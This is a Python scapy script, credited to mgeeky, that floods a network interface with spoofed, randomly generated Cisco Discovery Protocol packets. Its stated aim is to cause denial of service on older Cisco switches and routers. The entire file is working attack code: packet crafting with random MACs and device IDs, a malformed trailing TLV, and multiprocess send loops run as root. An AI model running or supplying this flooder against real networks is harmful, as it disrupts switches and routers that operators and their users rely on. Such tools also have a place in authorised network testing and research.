#!/usr/bin/python

#
# Effective CDP Flooder reaching about 1.7-2.1MiB/s (6-7,5K pps) triggering Denial of Service
# on older network switches and routers like Cisco Switch C2960.
# (p.s. Yersinia reaches up to even 10-12MiB/s - 65K pps!)
#
# Python requirements:
#   - scapy
#
# Mariusz Banach / mgeeky, '18, <mb@binary-offensive.com>
#

import sys
import struct
import string
import random
import argparse
import multiprocessing

try:
    from scapy.all import *
except ImportError:
    print('[!] Scapy required: pip install scapy')
    sys.exit(1)
 
VERSION = '0.1'

config = {
    'verbose' : False,
    'interface' : None,
    'packets' : -1,
    'processors' : 8,
    'source' : '',

    # CDP Fields
    'cdp-platform' : 'Cisco 1841',

    # Software version - at most 199 chars.
    'cdp-software-version' : '''Cisco IOS Software, 1841 Software (C1841-ADVSECURITYK9-M), Version 12.3(11)T2, RELEASE SOFTWARE (fc1)
Copyright (c) 1986-2004 by Cisco Systems, Inc.
Compiled Thu 28-Oct-04 21:09 by cmong''',
    
    # Interface taking up
    'cdp-interface' : 'FastEthernet0/1',
}

stopThreads = False


#
# ===============================================
#

class Logger:
    @staticmethod
    def _out(x): 
        if config['verbose']: 
            sys.stdout.write(x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[.] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[?] ' + x)
    
    @staticmethod
    def err(x): 
        sys.stdout.write('[!] ' + x + '\n')
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)

def cdpDeviceIDgen(size=2, chars=string.ascii_uppercase  +  string.digits  +  string.ascii_lowercase):
    return ''.join(random.choice(chars) for x in range(size))
 

def generatePacket():
    #
    # Parts of this function were taken from source code of 'cdp_flooder.py' by Chris McNab
    #   Network Security Assessment: Know Your Network
    #

    softVer = config['cdp-software-version'][:199]
    platform = config['cdp-platform'][:-4]
    iface = config['cdp-interface']
    deviceID = cdpDeviceIDgen(8)
    srcIP = Net(config['source']).choice()
    caps = random.randint(1, 65)

    etherframe      = Ether()                       #Start definition of Ethernet Frame
    etherframe.dst  = '01:00:0c:cc:cc:cc'           #Set Ethernet Frame destination MAC to Ciscos Broadcast MAC
    etherframe.src  = RandMAC()                     #Set Random source MAC address
    etherframe.type = 0x011e                        #CDP uses Type field for length information
   
    llcFrame      = LLC()                           #Start definition of Link Layer Control Frame
    llcFrame.dsap = 170                             #DSAP: SNAP (0xaa) IG Bit: Individual
    llcFrame.ssap = 170                             #SSAP: SNAP (0xaa) CR Bit: Command
    llcFrame.ctrl = 3                               #Control field Frame Type: Unumbered frame (0x03)
   
    snapFrame      = SNAP()                         #Start definition of SNAP Frame (belongs to LLC Frame)
    snapFrame.OUI  = 12                             #Organization Code: Cisco hex(0x00000c) = int(12)
    snapFrame.code = 8192                           #PID (EtherType): CDP hex(0x2000) = int(8192)
   
    cdpHeader      = CDPv2_HDR()                    #Start definition of CDPv2 Header
    cdpHeader.vers = 1                              #CDP Version: 1 - its always 1
    cdpHeader.ttl  = 255                            #TTL: 255 seconds
   
    cdpDeviceID      = CDPMsgDeviceID()             #Start definition of CDP Message Device ID
    cdpDeviceID.type = 1                            #Type: Device ID hex(0x0001) = int(1)
    cdpDeviceID.len  = 4 + len(deviceID)            #Length: 6 (Type(2) -> 0x00 0x01)  +  (Length(2) -> 0x00 0x0c)  +  (DeviceID(deviceIdLen))                            
    cdpDeviceID.val  = deviceID                     #Generate random Device ID (2 chars uppercase  +  int = lowercase)
   
    cdpAddrv4         = CDPAddrRecordIPv4()         #Start Address Record information for IPv4 belongs to CDP Message Address
    cdpAddrv4.ptype   = 1                           #Address protocol type: NLPID
    cdpAddrv4.plen    = 1                           #Protocol Length: 1
    cdpAddrv4.proto   = '\xcc'                      #Protocol: IP
    cdpAddrv4.addrlen = 4                           #Address length: 4 (e.g. int(192.168.1.1) = hex(0xc0 0xa8 0x01 0x01)
    cdpAddrv4.addr    = str(srcIP)                  #Generate random source IP address
   
    cdpAddr       = CDPMsgAddr()                    #Start definition of CDP Message Address
    cdpAddr.type  = 2                               #Type: Address (0x0002)                  
    cdpAddr.len   = 17                              #Length: hex(0x0011) = int(17)
    cdpAddr.naddr = 1                               #Number of addresses: hex(0x00000001) = int(1)
    cdpAddr.addr  = [cdpAddrv4]                     #Pass CDP Address IPv4 information
   
    cdpPortID       = CDPMsgPortID()                #Start definition of CDP Message Port ID
    cdpPortID.type  = 3                             #type: Port ID (0x0003)
    cdpPortID.len   = 4 + len(iface)                #Length: 13
    cdpPortID.iface = iface                         #Interface string
   
    cdpCapabilities        = CDPMsgCapabilities()   #Start definition of CDP Message Capabilities
    cdpCapabilities.type   = 4                      #Type: Capabilities (0x0004)
    cdpCapabilities.len    = 8                      #Length: 8
    cdpCapabilities.cap    = caps                   #Capability: Router (0x01), TB Bridge (0x02), SR Bridge (0x04), Switch that provides both Layer 2 and/or Layer 3 switching (0x08), Host (0x10), IGMP conditional filtering (0x20) and Repeater (0x40)
   
    cdpSoftVer      = CDPMsgSoftwareVersion()       #Start definition of CDP Message Software Version
    cdpSoftVer.type = 5                             #Type: Software Version (0x0005)
    cdpSoftVer.len  = 4 + len(softVer)              #Length
    cdpSoftVer.val  = softVer
   
    cdpPlatform      = CDPMsgPlatform()             #Statr definition of CDP Message Platform
    cdpPlatform.type = 6                            #Type: Platform (0x0006)
    cdpPlatform.len  = 4 + len(platform)            #Length
    cdpPlatform.val  = platform                     #Platform
        
    restOfCdp = cdpDeviceID / cdpAddr / cdpPortID / cdpCapabilities / cdpSoftVer / cdpPlatform
    
    cdpGeneric = CDPMsgGeneric()
    cdpGeneric.type = 0
    cdpGeneric.len = 0
    cdpGeneric.val = str(restOfCdp)

    cdpGeneric2 = CDPMsgGeneric()
    cdpGeneric2.type = struct.unpack('<H', platform[-4:-2])[0]
    cdpGeneric2.len = struct.unpack('<H', platform[-2:])[0]

    cdppacket = etherframe / llcFrame / snapFrame / cdpHeader / cdpGeneric / cdpGeneric2
    return cdppacket

def flooder(num, packets):
    Logger.info('Starting task: {}, packets num: {}'.format(num, len(packets)))
    packetsGen = []
    sock = conf.L2socket(iface = config['interface'])
    sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)

    for i in range(512):
        packetsGen.append(generatePacket())

    if len(packets) == 0:
        while stopThreads != True:
            try:
                for p in packetsGen:
                    if stopThreads: raise KeyboardInterrupt
                    sock.ins.send(str(p))
            except KeyboardInterrupt:
                break
    else:
        for p in packets:
            if stopThreads: break
            try:
                for pg in packetsGen:
                    if stopThreads: raise KeyboardInterrupt
                    sock.ins.send(str(pg))
            except KeyboardInterrupt:
                break

    Logger.info('Stopping task: {}'.format(num))
    sock.close()
 
def parseOptions(argv):
    global config

    print('''
        :: CDP Flooding / Denial of Service tool
        Floods the interface with fake, randomly generated CDP packets.
        Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
        v{}
'''.format(VERSION))

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options]')
    parser.add_argument('-i', '--interface', metavar='DEV', default='', help='Select interface on which to operate.')
    parser.add_argument('-n', '--packets', dest='packets', metavar='NUM', default=-1, type=int, help='Number of packets to send. Default: infinite.')
    parser.add_argument('-s', '--source', metavar='SRC', default='0.0.0.0/0', help='Specify source IP address/subnet. By default: random IP from 0.0.0.0/0')
    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')

    cdp = parser.add_argument_group('CDP Fields', 'Specifies contents of interesting CDP fields in packets to send')
    cdp.add_argument('--software', help = 'Software version')
    cdp.add_argument('--platform', help = 'Device Platform')
    cdp.add_argument('--cdpinterface', help = 'Device Interface')

    args = parser.parse_args()

    config['verbose'] = args.verbose
    config['interface'] = args.interface
    config['packets'] = args.packets
    config['source'] = args.source
    config['processors'] = multiprocessing.cpu_count()

    if args.cdpinterface: config['cdp-interface'] = args.cdpinterface
    if args.platform: config['cdp-platform'] = args.platform
    if args.software: config['cdp-sofware-version'] = args.software

    Logger.info('Will use {} processors.'.format(config['processors']))

    return args

def main(argv):
    global stopThreads

    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    if os.getuid() != 0:
        Logger.err('This program must be run as root.')
        return False

    load_contrib('cdp')

    packetsLists = [[] for x in range(config['processors'])]

    if config['packets'] > 0:
        for i in range(config['packets']):
            packetsLists[i % config['processors']].append(i)

    jobs = []

    for i in range(config['processors']):
        task = multiprocessing.Process(target = flooder, args = (i, packetsLists[i]))
        jobs.append(task)
        task.daemon = True
        task.start()

    print('[+] Started flooding. Press CTRL-C to stop that.')
    try:
        while jobs:
            jobs = [job for job in jobs if job.is_alive()]
    except KeyboardInterrupt:
        stopThreads = True
        print('\n[>] Stopping...')

    stopThreads = True
    time.sleep(3)

if __name__ == '__main__':
    main(sys.argv)
